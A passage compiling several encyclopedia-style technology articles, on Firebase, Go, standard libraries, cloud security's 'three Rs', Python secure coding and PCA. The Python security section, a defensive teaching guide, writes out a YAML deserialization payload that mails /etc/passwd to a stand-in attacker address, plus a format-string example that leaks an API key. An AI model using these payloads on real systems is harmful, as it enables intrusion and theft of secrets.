It 's now possible to do container - native load balancing for GKE - based applications .
Previously , load balancers worked on the granularity of VMs .
These VMs then used IPTable rules to route workloads to the right pods .
This was suboptimal and resulted in traffic hops between nodes .
With Network Endpoint Groups ( NEGs ) , load balancing can now be done based on the availability and health of pods rather than nodes .
Firebase Logo .
Source : Firebase 2018a .
Modern web and mobile apps are typically built with a mix of backendservicesandfrontendframeworks.
Would n't it be nice if there was a way for developers to focus on just the frontend and user experience , and let someone else take care of all backend requirements ?
It 's exactly in this context that Backend - as - a - Service ( BaaS ) has emerged .
Firebase started as a BaaS but after its acquisition by Google in 2014 , it 's now more deeply integrated into some parts of Google Cloud Platform .
Since then , Firebase has been described as " a comprehensive mobile development platform " .
The idea is to build apps faster without managing infrastructure .
Why should I adopt Firebase for my next web / mobile app ?
Firebase provides easy - to - use workflows common to many apps .
Examples include onboarding flow , customizing the " welcome back " screen , progressively rolling out new features , following the user journey across devices , adding chat to your app , optimizing ads based on user behaviour , enabling users to share and resize photos , processing third - party payments , and more .
These typically involve significant development on the server side .
Instead , Firebase offers out - of - the - box and easily deployable solutions to do this .
As a developer , you do n't have to worry about server - side software .
Mobile and web SDKs enable this .
The main offering is real - time sync of data between client apps and Firebase via Realtime Database and Cloud Firestore .
Using Authentication , user authentication feature is easy to build , even if it involves third - party providers such as Facebook or Twitter .
Messaging and notifications are efficiently done using Firebase Cloud Messaging ( FCM ) .
Unlike native apps updated via app stores , Remote Config can update Firebase apps without asking users to update their installation .
Using Crashlytics and Performance Monitoring app , stability and performance can be improved .
There 's good integration with Adwords and Admob .
Even UI testing across multiple devices is simplified via the Test Lab .
What are the products offered by Firebase ?
An overview of Firebase products .
Source : Sevilleja 2016 .
Firebase products can be grouped into three categories : Build : Helps developers build more powerful , secure and scalable apps .
Products include Cloud Firestore , ML Kit , Cloud Functions , Authentication , Hosting , Cloud Storage , Realtime Database .
Improve : Gives developers insights into app performance and stability .
Products include Crashlytics , Performance Monitoring , Test Lab .
Grow : Helps your app to grow .
Products include In - App Messaging , Google Analytics , Predictions , A / B Testing , Cloud Messaging , Remote Config , Dynamic Links , App Indexing .
What exactly is Firebase Hosting ?
Firebase web hosting .
Source : Firebase YouTube 2016 .
With the rise of powerful frontend frameworks ( Angular ) and static site generators ( Jekyll ) , it 's become possible to develop web apps without much server - side processing .
For hosting such web apps , Firebase Hosting is a suitable solution .
It serves content over secure connections , delivers content quickly due to caching on solid - state devices at CDN edges , enables rapid deployment and supports one - click rollbacks .
CDN edge servers ensure global availability of your app .
SSL certificates are free and automatically provisioned even for custom domains .
It 's also easy to deploy a sophisticated Progressive Web App ( PWA ) .
While Firebase Hosting serves static content , dynamic content can be served using Cloud Functions for Firebase .
Could you share more details about Firebase Cloud Messaging ( FCM ) ?
Components of Firebase Cloud Messaging .
Source : Firebase Docs 2018a .
FCM is a cross - platform messaging solution that can be used for pushing new data to client apps or notifying users .
Instant messaging has a payload limit of 2 KB .
From client to server , acknowledgments , chats , and other messages can be sent .
FCM consists of FCM servers managed by Google and an app server or other trusted environment such as Cloud Functions for Firebase .
All messages go via FCM servers .
Developers can use raw protocols ( HTTP / XMPP ) or use Admin SDK .
HTTP is synchronous and downstream .
XMPP is asynchronous and both downstream and upstream .
HTTP supports multicast as well .
In April 2018 , Google deprecated its Google Cloud Messaging ( GCM ) service .
GCM APIs will be available only until April 2019 .
Since GCM and FCM can not coexist in an app , developers must migrate to FCM .
FCM inherits the GCM infrastructure and adds many new features .
For more details , refer to the GCM / FCM FAQ .
What 's the price of Firebase products ?
Firebase gives the following services under the free tier : A / B Testing , Analytics , App Indexing , Authentication ( except Phone Auth ) , Cloud Messaging ( FCM ) , Crashlytics , Dynamic Links , Invites , Performance Monitoring , Predictions , and Remote Config .
With the free tier , you get some free access to other products with limits on storage , bandwidth , number of reads / writes / deletes / uploads / downloads / tests , etc .
A Realtime Database allows only 100 simultaneous connections .
Besides the free tier , there 's a fixed price per month and pay - as - you - go plans .
With the latter , the pricing of Realtime Databases , Cloud Firestore , Storage , Phone - Auth , Hosting , Test Lab , ML Kit , Use of BigQuery & other IaaS , is based on the use .
What are some criticisms of Firebase ?
Since 2016 , developers have noted many problems with Firebase .
While it 's good for enabling real - time apps with client - side logic , running complex database queries is almost impossible .
Firebase Realtime Database is nothing more than a large JSON file .
Data is duplicated since the benefits of relationships in a relational database are absent .
Filtering or paginating records is not possible .
More recently , the situation has improved with the Cloud Firestore that manages data using collections and documents .
Your data is on a server that you do n't control .
There 's no easy way to import / export data .
Firebase is also not open source .
If the service is discontinued , you have no choice but to rework your app .
While initial development may be faster , scaling up later may prove difficult .
Moving business logic from client to server wo n't be trivial .
When you scale , the cost of using Firebase will be higher than adopting a platform - as - a - service .
Developers ca n't work with a local installation .
A network connection is required .
They 're also at the mercy of Firebase 's upgrade cycles .
Firebase started as a startup named Envolve , founded by James Tamplin and Andrew Lee .
It provides developers with an API to integrate online chat functionality into their websites .
It 's been noticed that some apps using Envolve are doing things beyond chatting .
They use Envolve 's capability for synchronizing app data in real time .
This prompts its creators to separate the chat functionality from the underlying framework that enables real - time communications .
The latter could now be offered as a standalone service .
Thus , Firebase as a separate company was born .
Google acquires Firebase .
In following years , other Google acquisitions of Fabric / Crashlytics , Divshot , and LaunchKit added value to the Firebase portfolio of products .
Google announced Firebase at Google I / O as a unified platform for mobile developers .
Firebase now integrates deeply with some of Google 's cloud tools .
The user base of Firebase is now 470,000 , up from about 110,000 when Google acquired it .
The Firebase team announces a beta release of Cloud Firestore , a fully managed NoSQL document database .
Built in close collaboration with the Google Cloud Platform team , it 's replicated across regions and offers strong consistency .
However , for special use cases where cost and latency are important , Firebase Realtime Database may be preferred .
As a beta release , ML Kit becomes available on Firebase .
This allows developers to add machine learning features into their apps .
Use cases supported are recognizing text , detecting faces , scanning barcodes , labelling images and recognizing landmarks .
For advanced use cases , developers can also import TensorFlow Lite models .
It 's reported that over 1.5 million apps are using Firebase every month .
India 's Hotstar entertainment app is a Firebase - based app with over 150 million monthly active users .
Gopher , Go 's mascot .
Source : Dudeja 2017 .
Go is an open source , compiled , concurrent , garbage - collected , statically typed language developed by Google .
Google created it to solve its own problems in relation to multicore processors , networked systems and large codebases .
While languages such as C and C++ are fast , they are hard to master and development takes longer .
While Python is easier to work with , it compromises on runtime efficiency .
Go was designed to be efficient , scalable and productive .
Why was Go invented when there were already many popular languages ?
Go balances ease of programming , efficiency and concurrency support .
Source : Patel 2017 .
Go was invented ( in 2007 ) at a time when multicore CPU architectures were common , largely because Moore 's Law was failing to deliver .
With multiple cores , code could run in parallel on all available cores ; but there was no programming language that simplified the development of multithreaded applications .
The responsibility of managing different threads safely and efficiently fell on developers .
Thread - locking , race conditions and deadlocks are usual challenges .
Go was designed with concurrent programming in mind .
The Golang FAQ states that in the days before Go , one had to choose either efficient compilation , efficient execution , or ease of programming ; all three were not available in the same mainstream language .
Go balances these different expectations of a programming language .
Go was really designed to solve problems Google faced with large software systems .
Hence , it was less about research into language design and more about software engineering to solve problems at hand .
Some of the problems Google faced were slow builds , uncontrolled dependencies , poor code readability , challenges with automation tools and cross - language builds .
What are the main features of the Go language ?
Main features of Go .
Source : Qwentic 2018a .
Go 's main features include concurrency , scalability , error checking , fast performance , garbage collection and cross platform .
It 's fast because it 's a compiled language and not an interpreted one like JavaScript .
Garbage collection pauses have been reduced to about 100 microseconds .
Go 's built - in error type enables developers to spot errors early .
It 's designed for the cloud and can run on various platforms .
Because Go has types and methods , we can call it an object - oriented language .
But there 's no type of inheritance .
Instead , Go uses interfaces .
Go achieves concurrency using goroutines , which are then mapped to operating system threads .
If a thread is blocked , goroutines can be moved to another thread .
Goroutines are therefore cheap , requiring nothing more than stack memory .
Built - in channels are used to communicate between goroutines .
Go is opinionated and focused on its design goals .
Therefore , what it leaves out of the language is just as important .
Go does n't have generic types , exceptions and assertions .
Other features mentioned elsewhere are ` godoc ` for documentation ; ` gofmt ` for code formatting ; ` golint ` for linting ; built - in testing and profiling framework ; race condition detection .
What sort of applications can benefit from using the Go language ?
If you 're into systems programming with support for multithreading , Go is a suitable language .
Go can be used for building any server - side app containing thousands of communicating threads .
Due to its roots in Google , Go is suited for large distributed projects involving multiple teams .
It 's taken off in the cloud infrastructure space , platform automation , tooling apps and DevOps pipelines .
Go 's static binaries without external dependencies are easier to manage .
Cross - platform CLI tools can be created .
Because Go compiles to native code , performance - critical apps can benefit from it .
As Go 's Garbage Collection ( GC ) matures , it can suit embedded systems .
While Go was originally for systems programming , it 's been adopted for microservices .
This is due to its " elegant concurrency model , simple binary deployments , low number of external dependencies , fast performance , and runtime efficiency .
" There 's also an expectation ( back in 2015 ) that Go will grow into a general - purpose programming language and be adopted for GUI apps , IoT apps , web / mobile apps , robotics frameworks , and more .
It 's suited for data science work .
Alternatively , it 's been said that Go is not suitable for GUI apps , kernels , drivers or embedded systems .
How 's the adoption of Go language ?
Back in 2014 , it was reported that many open source projects have adopted Go : Docker , Kubernetes , Weave , Shipyard , etcd , Fleet , Deis , Flynn .
Since Go is suited to distributed server apps , all of these apps are cloud related .
Lime is an example of a desktop app for text editing .
InfluxDB , a distributed time series database , is written in Go .
Gogs ( Go Git Service ) helps you to run a Git service , like GitHub .
Go is a suitable fit for Docker due to static compilation and ability to build for different architecture with less effort .
Among the big names using Go are Uber , BBC , Novartis , Soundcloud and Basecamp .
Uber has reported better throughput , latency and uptime .
The BBC uses it for backend, including crawlers and web scrapers .
Soundcloud 's build and deployment system is in Go .
In 2016 , Go was rated the most popular language in the TIOBE index .
Multiple developer surveys in 2018 show interest and adoption of Go .
In StackOverflow 's survey , Go is in the top five most loved / wanted languages .
Community contribution to Go is growing steadily .
There 's also a curated list of companies worldwide using Go .
What are some criticisms of the Go language ?
Go does n't support generics , which means that code written for one data type ca n't be reused for another .
Interfaces are implicit .
Sometimes it 's hard to tell if a struct type implements an interface .
Library support for Go from vendors is lacking .
While Go is open source , key maintainers are seen to be non - receptive to suggestions from the community .
Packages are not versioned in a centralized place .
We ca n't define immutable data types .
Complex data types are not available out of the box : hash , tree , set .
Go does n't support overloading .
Compile - time checks are lacking .
It 's slow compared to C , C++ and Rust .
It 's been said that Rust succeeds in areas where Go fails .
There 's also a curated list of Go criticisms .
From Go 's perspective , some missing features are actually by design , reflecting Go 's simplicity .
Generics come with a higher complexity .
Without exceptions , developers are forced to do explicit error checking .
Overloading makes problems harder to debug .
Being minimal and opinionated means that everyone writes code the same way : there are no debates about using tabs versus spaces or for versus while .
For a beginner , what online resources can you recommend to learn Go programming ?
Learn Go in 12 Minutes .
Source : Wright 2018 .
Golang 's official FAQ page is a good place to start .
Other resources include the Go official documentation and the Go Wiki pages .
A curated list of Go frameworks and software is available on GitHub .
There 's also a curated list of 18 Go experts to follow .
For the latest news , the official Go blog and Golang Weekly newsletter are useful .
For conferences , there 's GopherCon and European dotGo .
First design notes for Go .
Source : Griesemer 2015 , slide 8 .
Three engineers at Google ( Robert Griesemer , Rob Pike and Ken Thompson ) invented Go .
Their aim is to design a better language for Google 's workflows .
In particular , they notice a lack of concurrency support in current languages and long build times .
They want a small , compiled language with modern features .
Go is made open source .
A major release named Go 1 has been released .
It 's stated that the language will be stable and compatible with future updates of Go 1 .
The world 's first Go conference , GopherCon , is organized in Denver , USA .
About 700 gophers ( Go developers ) attended the event .
As a dependency management tool for Go packages , dep is released .
Developers adopt this in preference to many community - led tools .
Dep uses semantic versioning plus a configuration file that specifies dependencies .
Version 0.1.0 of dep becomes available on GitHub in May 2017 .
At GopherCon 2017 , Russ Cox presented initial ideas for Go 2 with a goal " of fixing the most significant ways Go fails to scale .
" He outlines the community process through which Go 2 will be defined .
Early draft designs of Go 2 consider error values , error handling , and generic programming .
As of November 2018 , Go 2 is still under development .
Version Go 1.11 has been released .
Two major versions are supported at any point in time .
This means that versions 1.11 and 1.10 will be supported until version 1.12 appears .
Illustrating where a standard library fits .
Source : Blekhman 2008 .
Every programming language defines a basic set of components that can be reused by programs .
Every implementation of the language should provide these components .
This set of reusable components is what we call a standard library .
A good standard library is essential to the long - term success of a programming language .
However , there 's no consensus on what or how much should be included in a language 's standard library .
Python and Java have large standard libraries , while C takes a minimalistic approach .
The definition of a standard library is not limited to languages .
It can be extended , for example , to frameworks .
Thus , we can say that Django ( web framework ) and Robot Framework ( test automation framework ) have their own standard libraries that are installed by default with the framework .
What should a standard library typically include ?
Since the C standard library is minimal , it gives us an idea of what 's typically included .
These are either macro constants or functions .
In an object - oriented language such as C++ , classes , class templates and methods are part of the standard library .
Others ( Java , PHP ) may additionally include interfaces .
Operations that are deemed necessary for most programs are included .
A standard library will have functions to access the file system and perform input / output operations ; functions that deal with the data types of the language ; functions that allow memory allocation and manipulation ; functions that enable multithreaded programming ; functions to handle date and time ; common math functions ; functions for error handling and assertions .
Modern languages have a lot more than what the C standard library offers .
C++ has classes for containers , algorithms and regular expressions .
Python has packages for data persistence , data compression , cryptography , exception handling , networking , CSV / XML parsing , GUI , testing , profiling , and more .
What are some advantages of using a standard library ?
Developers can focus on their application logic rather than low - level details , which are provided by the standard library .
Codes can be reused for projects .
Code is more maintainable since most developers will be familiar with the standard library .
There 's also a shorter learning curve for new developers joining a project .
Since implementations of the standard library are optimized and well tested , programs that use them are likely to be more reliable .
If the language is open source , developers can also study the implementation of the standard library to learn best practices .
Projects that use the standard library might even be smaller since developers are not introducing custom code for some modules while using the standard library in others .
How are standard libraries delivered or distributed ?
A standard library is not simply one physical document but rather a combination of many things : Standards document : This is the main document released with every version of the language .
This will include core parts of the language plus what 's in its standard libraries .
For example , C and C++ standards documents are released by ISO and must be purchased .
In other languages , these may be more readily available online .
Header files : This is typical of C and C++ .
Header files specify what 's available in the standard libraries .
Implementations : When a language compiler or interpreter is installed on a machine , an implementation of the standard library is also installed .
In Python , users have a choice of different implementations of the standard library , with CPython being the default .
Delivery : In C and C++ , implementations are object files .
In Python , they are packages containing modules .
In Java , we have packages containing classes .
In client - side JavaScript , implementation is built into the web browser .
Documentation and header files may also be termed as the Application Programming Interface ( API ) of the language .
It 's also common for vendors to include useful non - standard functions at the expense of portability .
Who should read standard libraries ?
There are a few types of folks who need to read them : compiler writers , those who implement standard libraries , tool vendors , and users of the standard libraries .
Standards documents are usually hard to read because they are formal , legal and highly detailed .
They are meant for compiler writers and those who implement standard libraries .
Tool vendors may also read them .
For everyone else , it 's usually sufficient to read the documentation on how to use the standard libraries in their code .
Tutorials and example code showing the use of standard libraries are more useful than reading the language standards .
What are some considerations when defining a standard library ?
What a standard library provides should fulfil the needs of programmers .
In 2016 , when initiating a revision of the C standard , convener David Keaton pointed out that security threats on the Internet are growing , Moore 's Law is failing and there 's a need to exploit concurrency and parallelism in programs .
Languages must therefore evolve to address these new concerns .
A standard library must balance stability and evolution .
Design should address safety , security , simplicity , interoperability , demanding application domains , and embedded systems .
To add a feature , we must consider how it would interact with other features .
Updates to the standard library must be backward compatible to earlier versions .
While there could be some platform - dependent features , portability should be improved .
Sometimes portability may be sacrificed for performance , at least in C. One point of view is that most standard libraries lack features and they are incompatible across languages .
What if you could write a library in one language and automatically translate it into any desired language ?
Loyc Multi - Language Standard Library ( MLSL ) aims to do this .
Should a standard library be exhaustive or minimal ?
C and C++ are minimal .
Java provides many higher level utilities out of the box .
While this benefits developers , it also bloats the language .
Some APIs have become antiquated and less useful , though they will have to be maintained unless deprecated .
Python also adopts the " batteries included " approach and provides many sophisticated packages as part of the standard library .
While this is useful , it also means that new implementations have more work to do .
A small library implies that multiple implementations are possible and all programmers can rely on it .
There 's been some debate about moving C++ towards a " batteries included " approach , such as adding a graphics library .
Alternatively , C++ can be kept minimal while finding a better way to distribute libraries and dependencies .
The choice that language designers make must be governed by its main purpose .
Should it be a general purpose language or satisfy a niche ?
It 's been said , no language can be everything for everybody .
Could you list some examples of standard libraries ?
Here 's a short and non - exhaustive list of some standard libraries : C : assert , float , math , stdio , stdlib , string , threads C++ : list , map , deque , vector , algorithm , iterator , string , regex , fstream , iostream , exception Python : list , dict , tuple , range , open , enum , collections , math , pickle , zlib , threading , queue , email , json Go : tar , gzip , heap , crypto , hash , image , io , mime , net , os , path , strings , time , unicode Java : java.lang , java.io , java.net , java.math , java.text , java.awt.image , java.security , java.beans What happens if commonly required functions are not part of a standard library ?
There 's nothing in the C standard library to help a developer send emails from a C program .
The developer is forced to build this feature from low - level networking constructs .
Moreover , that code ca n't be reused by others since it 's not part of the standard library .
This is where the power of the community becomes important .
Useful functions that are not part of the standard library are curated , reviewed and shared via public repositories .
In Java , there 's the Apache Commons .
In Python , there 's PyPI .
For C++ , Boost provides peer - review libraries , some of which were later accepted into the standard library .
For C , there 's a POSIX standard library that enables portability across different variants of UNIX / Linux while adding many functions missing in the C standard library .
C++ Boost binaries can be downloaded and installed for your platform .
Modern languages implement the concept of package / dependency management .
Software is gathered into centralized repositories and tools exist to manage packages and version dependencies as necessary for your project .
Example repositories include Packagist ( PHP ) , PyPI ( Python ) , CPAN ( perl ) , NPM ( Node.js ) , and Maven ( Java ) .
Are there well - defined processes to evolve the standard libraries ?
C++ standardization process .
Source : Everything Cpp 2017 .
Languages that are proprietary ( such as MATLAB or Wolfram ) will have closed processes .
Customers of these products may request features .
Otherwise , they have little control over how the language or its standard library evolves .
On the other hand , more open languages are standardized by a process that allows greater community participation .
Both C and C++ are standardized by the International Organization for Standardization ( ISO ) .
Meetings are organized regularly to discuss changes to the language .
Participants are organized into working groups .
Proposals are submitted and refined to produce working drafts .
Voting by members will promote these drafts to become part of the standard library .
Those who wish to make proposals , should study the Standard Library Guidelines .
In the case of Python , the Python Software Foundation ( PSF ) does regular releases .
Any modification to the standard library is done via a Python Enhancement Proposal ( PEP ) .
Proposals are discussed and documented in draft stages .
Once finalized , they 're implemented .
Java has the Java Community Process ( JCP ) and proposals are managed as Java Specification Requests ( JSRs ) .
The PHP has an RFC process with clear guidelines on how to participate .
The ANSI C standard library is standardized to overcome compatibility problems across variations and implementations of the C language .
Efforts towards this important milestone started back in 1983 when the American National Standards Institute ( ANSI ) formed a committee .
This standard is also called C89 .
Normative Addendum 1 ( NA1 ) was added to it in 1995 .
With the ` integer ` library as its first entry , an experimental release of Boost is introduced for C++ .
As ISO / IEC 30170:2012 , Ruby is published as an ISO standard .
Timeline of C++ standards .
Source : Grimm 2017 .
ISO standardizes C++17 for the C++ language .
C++ was first standardized in 1998 .
The next planned evolution is named C++20 , to be released in 2020 .
The C++ Standard Library was previously called Standard Template Library ( STL ) .
The three Rs of security .
Source : Devopedia .
Security is an important concern in all computer systems .
This is more so with complex enterprise systems deployed on cloud infrastructure .
An application composed of dozens of microservices running hundreds of containers across multiple nodes is hard to secure without good guiding principles .
The methodology of three Rs — Rotate , Repave and Repair — offers a simple approach towards greater security of your cloud deployments .
The basic idea is to be proactive rather than be reactive as seen in traditional enterprise security .
Speed is of essence .
The longer a deployment stays in a given configuration , the greater the opportunity for threats to exploit any vulnerabilities .
What problem does the third R model solve ?
Typical threats that the three Rs model attempts to mitigate .
Source : Smith 2016b , slide 15 .
With DevOps , it 's become possible to deliver software faster .
Yet security is one aspect that 's been slow to change .
This is often seen in firewall rules , long - lived credentials , and hard - to - update databases .
The choice is between moving quickly and accepting the associated risks ; or moving slowly to mitigate risk .
Often , enterprises choose to move slowly .
In 2016 , the U.S. Intelligence identified cyberthreats as a greater threat than terrorism or traditional weapons of mass destruction .
Enterprises are spending a lot on securing endpoints and networks .
Yet , Gartner 's research shows that 70 % of vulnerabilities are in the application layer .
The basic premise of the three Rs model is that the more time you give to attacks , the more opportunities they get to cause some serious damage .
So it 's best to embrace change and move quickly .
It 's been said that , to get safer , you have to go faster , and that is the exact opposite of how organizations work today .
Could you explain each of the three Rs ?
Do n't persist keys and certificates for a long time .
Source : Deogun and Sawano 2018 , slide 33 .
The three Rs of security are the following : Rotate : Rotate datacenter credentials every few minutes or hours .
Credentials could be passwords , certificates , access tokens , etc .
Repave : Repave every server and application in the datacenter every few hours from a known good state .
Rather than patching a particular software , patch the whole stack .
Destroy old VMs and containers and recreate them from a known good state .
Use rolling deployments to minimize downtime .
Repair : Repair vulnerable operating systems and application stacks consistently within hours of patch availability .
The idea is to give attacks less time to snoop around and learn about your system .
It 's feasible to adopt the three Rs today due to cloud - native architectures and continuous deployments .
In fact , it may no longer be a badge of honour to claim that your server has been running for years without a reboot .
From a security perspective , it 's better to limit the maximum uptime of a server .
How are the three Rs of security related to DevOps ?
DevOps is a combination of people , processes and tools that enables teams to deliver software faster .
Teams do n't work in silos .
A DevOps workflow that includes security is what we call DevSecOps .
DevSecOps attempts to include security concerns at all stages of a development workflow .
The three Rs model may be seen as a subset of DevSecOps .
Security at the application layer can never be perfect .
The solution is to mitigate the risks during operations .
DevOps already includes a wealth of tools and automation .
These can be used to implement the three Rs model .
Justin Smith , a security expert at Pivotal , blogs about the three Rs model .
In May , he presented the model at the Cloud Foundry Summit in Silicon Valley .
At about the same time , a news article on The New Stack names the three Rs as Cloud Foundry 's security strategy .
The three R model made it to the Technology Radar of ThoughtWorks .
They note that this is feasible because of cloud - native architectures .
Apps must be designed to be resilient to failures .
The use of the three Rs model at the network edges , including embedded or IoT devices , is discussed .
Many devices are still being deployed with default passwords .
Rotating credentials at the edge is a challenge .
The three Rs model was presented at the Devoxx Poland conference .
This indicates a growing awareness of the model within the developer community .
Writing secure code is essential for protecting sensitive data and maintaining correct behaviour of applications .
This is more relevant today when most applications connect to the web , exchange data and even update themselves .
While security considerations and best practices are typically language agnostic , in this article we focus on Python - specific issues .
OWASP 's Python Security project has identified three angles : Security in Python ( white - box analysis , functional analysis ) , Security of Python ( black - box analysis ) , and Security with Python ( develop security - hardened Python ) .
While some vulnerabilities are due to the way Python modules and functions behave , others are due to the manner in which third - party packages are distributed .
Since Python is an open developer ecosystem , anyone can share their own packages that others can use in their projects .
However , this opens up a security risk that developers need to be aware of .
What are some guidelines for writing more secure Python code ?
Python2 's input ) is problematic .
Source : Branca 2014 , slide 28 .
It 's essential to validate user input .
If not , an attacker could execute an arbitrary code .
Python functions ` eval ( ) ` , ` exec ( ) ` , ` input ( ) ` , ` popen ( ) ` , ` subprocess ( ) ` and ` os.system ( ) ` are dangerous in this regard .
These could be used to bypass authentication or inject code .
For example , Python2 's ` input ( ) ` could be exploited .
An input of ` passwd ` to the statement ` if passwd = = input("Please enter your password " ) : ` would bypass authentication .
Databases are also vulnerable to inputs .
Commonly called SQL injection , using inputs directly in database commands is dangerous .
Instead , validate the inputs and query databases via an ORM .
Among the well - known Python ORMs are Django ORM , SQLAlchemy and Peewee .
The Python ` assert ` statement must be used only on invariants for debugging .
Using them for authentication ( such as ` assert user.is_admin , " user does not have access " ` ) is wrong .
Often on production servers , ` debug = = False ` and assert statements wo n't work .
To create temporary files , avoid the deprecated ` tempfile.mktemp ( ) ` function .
In general , keep your Python distribution and the packages you use up to date .
For example , earlier CPython implementations of Python had memory overflow errors that could be exploited for arbitrary code execution .
How should I manage Python dependencies for a more secure application ?
Process flow of a typosquatting attack on PyPI .
Source : Bertus 2018 .
PyPI is the repository from where third - party Python packages can be downloaded and installed if required by your project .
Direct dependencies may have further dependencies .
Any of these could have malicious code .
It 's easy to create a malicious package based on a well - known package since the original code is open source and easily copied .
Often , these packages behave normally since the malicious code only resides in ` setup.py ` that executes once during installation .
This is enough to install software that can later steal data or monitor behaviour .
Some attacks modify the original code , for example , to steal SSH credentials .
Developers can be tricked into installing the wrong package by a slight modification of the original package name .
This is called typosquatting .
There are plenty of examples : ` acqusition ` impersonates ` acquisition ` ; ` bzip ` impersonates ` bz2file ` ; ` crypt ` impersonates ` crypto ` ; ` setup - tools ` impersonates ` setuptools ` ; ` urlib3 ` impersonates ` urllib3 ` ; ` diango ` impersonates ` django ` .
PEP458 proposes signing a package .
However , this only verifies its author 's identity .
Instead , a combination of dynamic analysis ( within a sandbox ) and static analysis can be used to catch malicious packages .
What security risks do Python strings pose if used improperly ?
Python3 introduced ` str.format ( ) ` as a more powerful and flexible way to format strings .
This method is called on a format string and it accepts Python objects as arguments .
The problem is that attributes of these arguments can be accessed from within the format string .
If the application allows users to control the format string , it can be misused to leak sensitive data .
There are a few cases where such control may be common .
Applications that are translated into multiple languages may use untrusted translators who may be given control of the format string .
Some applications may permit users to configure behaviour that might be exposed as format strings .
An example exploit is the code ` " { person.init.globals[CONFIG][API_KEY]}".format(person ) ` , where sensitive global data from a ` CONFIG ` dictionary is being accessed via the argument .
We can overcome this by validating the format string .
One approach is shown by Armin Ronacher , who subclasses ` Formatter ` and ` Mapping ` , makes use of ` formatter_field_name_split ` and throws an ` AttributeError ` if unsafe formats are detected .
What 's a secure way to do data deserialization in Python ?
An example exploit of pickle .
Source : Branca 2014 , slide 33 .
Deserialization recreates Python objects by reading their representation from the disk or network interface .
It 's possible to deserialize malicious data and thereby execute arbitrary code in your system .
This is because objects are not just values .
They contain constructors and methods that are executable code .
For example , a web application could store user information in a cookie that 's formed using ` cPickles ` or ` pickle ` module .
The object 's ` reduce ` method could be modified to contain malicious code .
This method would be called during deserialization .
A better approach would be to use ` json.loads ( ) ` .
If ` cPickles ` is used , verify the payload integrity using cryptographic signatures .
PyCrypto is a useful package for this .
Another serialization format is YAML .
YAML files can represent Python objects .
Like ` pickle ` , it 's possible to modify them to bypass authentication or execute arbitrary code .
For example , configuration files in Ansible are YAML files .
The following code obtains passwords and emails the same to the hacker 's address : ` !
!
python / object / apply : os.system [ " cat /etc / passwd | mail hacker@domain.com " ] ` .
Essentially , it 's unwise to deserialize from an untrusted source .
A safer alternative is to use ` yaml.safe_load ( ) ` rather than ` yaml.load ( ) ` .
What are some resources for Python developers to create more secure code ?
Python core modules that can help developers build security features include ` hashlib ` , ` hmac ` and ` secrets ` .
For passwords and security tokens , ` secrets ` must be preferred over ` random ` .
functions ` hmac.compare_digest ( ) ` and ` secrets.compare_digest ( ) ` are designed to mitigate timing attacks .
Bandit is a useful static linter that can alert developers to common security issues in code .
Another static analyzer , open sourced by Facebook , is Pysa .
To audit installed packages and their versions , use a tool such as Chef InSpec .
PyUp tracks thousands of Python packages for vulnerabilities and makes pull requests to your codebase automatically when there are updates .
Python Security is an OWASP project aimed at creating a security - hardened version of Python .
Their page on security concerns in modules and functions is worth reading .
They 've also curated a list of Python libraries for security applications .
Some Python Enhancement Proposals ( PEPs ) specific to security are worth reading for in - depth understanding .
Among them are PEP458 , PEP506 , PEP551 , and PEP578 .
Python 3.0 has been released .
This release includes PEP 3101 -- Advanced String Formatting .
Strings can now be formatted using the ` str.format ( ) ` method .
For more secure code , it 's noted that applications should n't format strings from untrusted sources .
The next best approach is to ensure that string formatting does n't result in visible side effects , though this is not easy to achieve given the open nature of Python .
Different approaches to modifying a pickle stream .
Source : Slaviero 2011 , fig .
3 .
Marco Slaviero publishes a detailed report on the many possible exploits and attack scenarios on the ` pickle ` module .
He gives guidelines on how to write shellcode to create such exploits .
He provides a library of exploits , such as retrieving a list of globals and locals , making operating system calls , executing arbitrary Python code , altering local variables or creating DoS attacks .
Python 3.6.0 has been released .
This release includes the ` secrets ` module that 's documented in PEP 506 .
Python 's existing ` random ` module is not suited for security purposes .
Though documentation makes this clear , many implementations are seen to ignore this warning .
To solve this problem , the ` secrets ` module includes ready - to - use functions for managing passwords , tokens and other secrets .
Malicious packages were found on PyPI via static analysis .
Source : Bertus 2018 .
Bertus , a software security engineer , creates a static analysis tool to automatically detect if a package published on PyPI is malicious .
From a scan of 123,000 packages , he identified about a dozen such packages containing various exploits .
Overview of role metadata on PyPI .
Source : Kuppusamy et al .
2013 , fig .
1 .
Discussions have started towards implementing PEP 458 -- Secure PyPI downloads with signed repository metadata .
Although this PEP was started in 2013 , funding became available only recently .
The idea of this proposal is that authors need not sign the packages they upload to PyPI .
PyPI will automatically sign these packages using keys managed by PyPI .
This is called the minimum security model .
This PEP does n't address the maximum security model in which authors can sign the packages .
German software developer Lukas Martini finds two packages on PyPI that are doing typosquatting .
These are ` python3-dateutil ` ( impersonating ` dateutil ` ) and ` jeIlyfish ` ( impersonating ` jellyfish ` ) .
The former does n't have any malicious code but it imports the latter .
Package ` jeIlyfish ` downloads a file , decodes it into Python code and executes it .
This code attempts to read SSH and GPG keys from the computer and send them to a specific IP address .
Pysa tracks data flows through the program .
Source : Bleaney and Cepel 2020 .
Facebook open sources Pysa , a static analysis code to detect and prevent security issues in Python code .
It 's shipped as part of Pyre , a static type checker tool .
Pysa tracks data flows .
Developers define sources where data originates and sinks where data should n't end up .
It warns when data reaches a sink .
It has techniques to mitigate false positives and false negatives .
PCA in a nutshell .
Source : Lavrenko and Sutton 2011 , slide 13 .
Big data is increasingly becoming the norm and affecting many domains .
When there 's lots of data involving multiple variables , the work of a data scientist gets difficult .
Algorithms will also take longer to complete .
Would n't it be sensible to identify and consider only those variables that influence the most and discard others ?
Principal Component Analysis ( PCA ) extracts the most important information .
This in turn leads to compression since the less important information is discarded .
With fewer data points to consider , it becomes simpler to describe and analyze the dataset .
PCA can be seen as a trade - off between faster computation and less memory consumption versus information loss .
It 's considered as one of the most useful tools for data analysis .
Could you explain PCA with a simple example ?
Illustration of principal component analysis .
Source : Werner and Friedrich 2014 , fig .
1 .
We can describe the shape of a fish with two variables : height and width .
However , these two variables are not independent of each other .
In fact , they have a strong correlation .
Given the height , we can probably estimate the width ; and vice versa .
Thus , we may say that the shape of a fish can be described by a single component .
This does n't mean that we simply ignore either height or width .
Instead , we transform our two original variables into two orthogonal ( independent ) components that give a complete alternative description .
The first component ( blue line ) will explain most of the variation in the data .
The second component ( dotted line ) will explain the remaining variation .
Note that both components are derived from both height and width .
More intuitively , the first component line can be seen as the best - fit line that minimizes information loss .
Alternatively , it can also be seen as the line that maximizes the variation ; that is , it tries to explain as much of the variation in the dataset as possible .
